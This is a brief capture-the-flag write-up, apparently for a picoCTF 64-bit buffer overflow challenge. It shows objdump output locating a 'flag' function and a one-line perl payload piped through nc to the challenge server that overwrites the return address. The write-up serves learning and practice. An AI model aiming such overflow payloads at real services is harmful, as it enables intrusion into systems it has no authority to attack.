# Notes
- Just need to overflow 64-bit to get the flag. No PIE
```
x-sixty-what[master*] $ objdump -D vuln | grep flag
0000000000401236 <flag>:
  40125e:       75 29                   jne    401289 <flag+0x53>
```
- Buffer to overflow is 64 bytes

# Writeup

perl -e 'print "A"x72 . "\x3b\x12\x40\n"' | nc saturn.picoctf.net 50096
